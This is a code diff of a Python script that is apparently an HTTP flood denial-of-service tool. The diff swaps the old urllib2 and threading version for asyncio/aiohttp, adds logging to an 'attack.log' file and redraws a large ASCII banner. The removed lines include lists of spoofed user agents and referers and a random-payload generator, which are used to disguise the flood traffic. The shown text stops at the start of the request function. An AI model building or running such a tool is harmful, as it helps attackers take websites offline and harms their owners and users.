@@ -1,102 +1,82 @@
-#!/usr/bin/python3
 # -*- coding: utf-8 -*-
-import os
-import urllib2
-import sys
+#! /usr/bin/python3.11
+
 import time
-import threading
-import random
+import datetime
+import asyncio
+from collections import Counter
+from statistics import mean
+from urllib.parse import urlparse
+from sys import stdout
+import logging
+import contextlib
+
+import validators
+import aiohttp
 from colorama import Fore, Style, init
 
-# Inisialisasi colorama
+
+# Init color & logging
 init(autoreset=True)
+logging.basicConfig(
+    filename='attack.log',
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    datefmt='%Y-%m-%d %H:%M:%S'
+)
 
-def clear():
-    os.system("cls" if os.name == "nt" else "clear")
 
-#global params
-url=''
-host=''
-headers_useragents=[]
-headers_referers=[]
-request_counter=0
-flag=0
-safe=0
+def log_attack_status(message, level='info', print_to_terminal=True):
+    if level == 'info':
+        logging.info(message)
+        if print_to_terminal:
+            print(f"{Fore.CYAN}|    [INFO] {message.ljust(63)}|")
+    elif level == 'error':
+        logging.error(message)
+        if print_to_terminal:
+            print(f"{Fore.RED}|    [ERROR] {message.ljust(63)}|")
+    elif level == 'warning':
+        logging.warning(message)
+        if print_to_terminal:
+            print(f"{Fore.YELLOW}|    [WARNING] {message.ljust(63)}|")
 
-def inc_counter():
-	global request_counter
-	request_counter+=1
 
-def set_flag(val):
-	global flag
-	flag=val
+def display_header():
+    header_lines = [
+        f"{Fore.GREEN}══════════════════════════════════════════════════════════════════════════",
+        f"{Fore.YELLOW}",
+        f"{Fore.YELLOW} ██████▒▒   ██▒▒                 ██████▒▒ ██▒▒   ██▒▒",
+        f"{Fore.YELLOW} ██▒▒   ██▒▒██▒▒                ██▒▒      ██▒▒  ██▒▒",
+        f"{Fore.YELLOW} ██▒▒   ██▒▒██▒▒                ██▒▒      ██▒▒ ██▒▒",
+        f"{Fore.YELLOW} ██▒▒   ██▒▒██▒▒        {Fore.RED}█▒▒     {Fore.YELLOW}██▒▒      ██▒▒██▒▒",
+        f"{Fore.YELLOW} █████▒▒    ██▒▒       {Fore.RED}███▒▒    {Fore.YELLOW}██▒▒      ██▒██▒▒",
+        f"{Fore.YELLOW} ██▒▒   ██▒▒██▒▒      {Fore.RED}██▒██▒▒   {Fore.YELLOW}██▒▒      ██▒▒██▒▒ ",
+        f"{Fore.YELLOW} ██▒▒   ██▒▒██▒▒     {Fore.RED}██▒▒ ██▒▒  {Fore.YELLOW}██▒▒      ██▒▒ ██▒▒",
+        f"{Fore.YELLOW} ██████▒▒   ██████▒▒{Fore.RED}██▒▒   ██▒▒  {Fore.YELLOW}██████▒▒ ██▒▒   ██▒▒",
+        f"{Fore.RED}                   {Fore.RED}██▒▒     ██▒▒    {Fore.GREEN}███████▒▒  ████▒▒     ████▒██▒▒       ██▒▒",
+        f"{Fore.RED}                  {Fore.RED}████████▒▒ ██▒▒   {Fore.GREEN}██▒▒   ██▒▒██▒██▒▒   ██▒██▒▒██▒▒     ██▒▒",
+        f"{Fore.RED}                 {Fore.RED}██▒▒         ██▒▒  {Fore.GREEN}██▒▒   ██▒▒██▒▒██▒▒ ██▒▒██▒▒ ██▒▒   ██▒▒",
+        f"{Fore.RED}                {Fore.RED}██▒▒           ██▒▒ {Fore.GREEN}██▒▒   ██▒▒██▒▒ ██▒██▒▒ ██▒▒  ██▒▒ ██▒▒",
+        f"{Fore.GREEN}               {Fore.RED}██▒▒             ██▒▒{Fore.GREEN}██▒▒   ██▒▒██▒▒  ███▒▒  ██▒▒   ██▒██▒▒",
+        f"{Fore.GREEN}                                    ██████▒▒   ██▒▒   ██▒▒  ██▒▒    ███▒▒",
+        f"{Fore.GREEN}                                    ██▒▒ ██▒▒  ██▒▒         ██▒▒     ██▒▒",
+        f"{Fore.GREEN}                                    ██▒▒   ██▒▒██▒▒         ██▒▒     ██▒▒",
+        f"{Fore.GREEN}",
+        f"{Fore.GREEN} ",    
+        f"{Fore.RED}    █████▒▒  ███▒▒   ██▒▒   ██▒▒ █▒▒  █▒▒ ██▒▒ █▒▒ █▒▒███████▒▒ █▒▒   █▒▒",
+        f"{Fore.RED}   █▒▒      █▒▒  █▒▒ █▒█▒▒ █▒█▒▒ █▒▒  █▒▒ █▒█▒▒█▒▒ █▒▒   █▒▒     █▒▒ █▒▒",
+        f"{Fore.WHITE}   █▒▒      █▒▒  █▒▒ █▒▒█▒█▒▒█▒▒ █▒▒  █▒▒ █▒▒█▒█▒▒ █▒▒   █▒▒      ██▒▒",
+        f"{Fore.WHITE}    ████▒▒   ███▒▒   █▒▒██▒▒ █▒▒  ███▒▒   █▒▒ ██▒▒ █▒▒   █▒▒       █▒▒",
+        f"{Fore.WHITE}",      
+        f"{Fore.YELLOW}════════════════════════════════════════════════════════════════════════════",
+    ]
+    for line in header_lines:
+        print(line)
+    # Versi dan URL
+    print(f"{Fore.WHITE}{Style.BRIGHT}{' ' * 57}v.1.0")
+    print(f"{Fore.CYAN}{Style.BRIGHT}{' ' * 16}https://kunkaffa@gmail.com")
+    print(f"{Fore.CYAN}|{'=' * 74}|")
 
-def set_safe():
-	global safe
-	safe=1
-	
-
-def useragent_list():
-	global headers_useragents
-	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
-	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-	return(headers_useragents)
-
-# generates a referer array
-def referer_list():
-	global headers_referers
-	headers_referers.append('http://www.google.com/?q=')
-	headers_referers.append('http://www.usatoday.com/search/results?q=')
-	headers_referers.append('http://engadget.search.aol.com/search?q=')
-	headers_referers.append('http://' + host + '/')
-	return(headers_referers)
-	
-
-def buildblock(size):
-	out_str = ''
-	for i in range(0, size):
-		a = random.randint(95, 165)
-		out_str += chr(a)
-	return(out_str)
-
-def usage():
-        Fore.GREEN + "══════════════════════════════════════════════════════════════════════════",     
-        Fore.YELLOW + " ██████▒▒   ██▒▒                 ██████▒▒ ██▒▒   ██▒▒",
-        Fore.YELLOW + " ██▒▒   ██▒▒██▒▒                ██▒▒      ██▒▒  ██▒▒",
-        Fore.YELLOW + " ██▒▒   ██▒▒██▒▒                ██▒▒      ██▒▒ ██▒▒",
-        Fore.YELLOW + " ██▒▒   ██▒▒██▒▒        " + Fore.RED + "█▒▒     " + Fore.YELLOW + "██▒▒      ██▒▒██▒▒",
-        Fore.YELLOW + " █████▒▒    ██▒▒       " + Fore.RED + "███▒▒    " + Fore.YELLOW + "██▒▒      ██▒██▒▒",
-        Fore.YELLOW + " ██▒▒   ██▒▒██▒▒      " + Fore.RED + "██▒██▒▒   " + Fore.YELLOW + "██▒▒      ██▒▒██▒▒ ",
-        Fore.YELLOW + " ██▒▒   ██▒▒██▒▒     " + Fore.RED + "██▒▒ ██▒▒  " + Fore.YELLOW + "██▒▒      ██▒▒ ██▒▒",
-        Fore.YELLOW + " ██████▒▒   ██████▒▒" + Fore.RED + "██▒▒   ██▒▒  " + Fore.YELLOW + "██████▒▒ ██▒▒   ██▒▒",
-        Fore.RED + "                   ██▒▒     ██▒▒    " + Fore.GREEN + "███████▒▒  ████▒▒     ████▒██▒▒       ██▒▒",
-        Fore.RED + "                  ████████▒▒ ██▒▒   " + Fore.GREEN + "██▒▒   ██▒▒██▒██▒▒   ██▒██▒▒██▒▒     ██▒▒",
-        Fore.RED + "                 ██▒▒         ██▒▒  " + Fore.GREEN + "██▒▒   ██▒▒██▒▒██▒▒ ██▒▒██▒▒ ██▒▒   ██▒▒",
-        Fore.RED + "                ██▒▒           ██▒▒ " + Fore.GREEN + "██▒▒   ██▒▒██▒▒ ██▒██▒▒ ██▒▒  ██▒▒ ██▒▒",
-        Fore.RED + "               ██▒▒             ██▒▒" + Fore.GREEN + "██▒▒   ██▒▒██▒▒  ███▒▒  ██▒▒   ██▒██▒▒",
-        Fore.GREEN + "                                    ██████▒▒   ██▒▒   ██▒▒  ██▒▒    ███▒▒",
-        Fore.GREEN + "                                    ██▒▒ ██▒▒  ██▒▒         ██▒▒     ██▒▒",
-        Fore.GREEN + "                                    ██▒▒   ██▒▒██▒▒         ██▒▒     ██▒▒",
-        Fore.RED + "    █████▒▒  ███▒▒   ██▒▒   ██▒▒ █▒▒  █▒▒ ██▒▒ █▒▒ █▒▒███████▒▒ █▒▒   █▒▒",
-        Fore.RED + "   █▒▒      █▒▒  █▒▒ █▒█▒▒ █▒█▒▒ █▒▒  █▒▒ █▒█▒▒█▒▒ █▒▒   █▒▒     █▒▒ █▒▒",
-        Fore.WHITE + "   █▒▒      █▒▒  █▒▒ █▒▒█▒█▒▒█▒▒ █▒▒  █▒▒ █▒▒█▒█▒▒ █▒▒   █▒▒      ██▒▒",
-        Fore.WHITE + "    ████▒▒   ███▒▒   █▒▒██▒▒ █▒▒  ███▒▒   █▒▒ ██▒▒ █▒▒   █▒▒       █▒▒",
-        Fore.YELLOW + "════════════════════════════════════════════════════════════════════════════",     
-	
-    
-        time.sleep(0.0015)  # typing effect
-
-#http request
 def httpcall(url):
 	useragent_list()
 	referer_list()
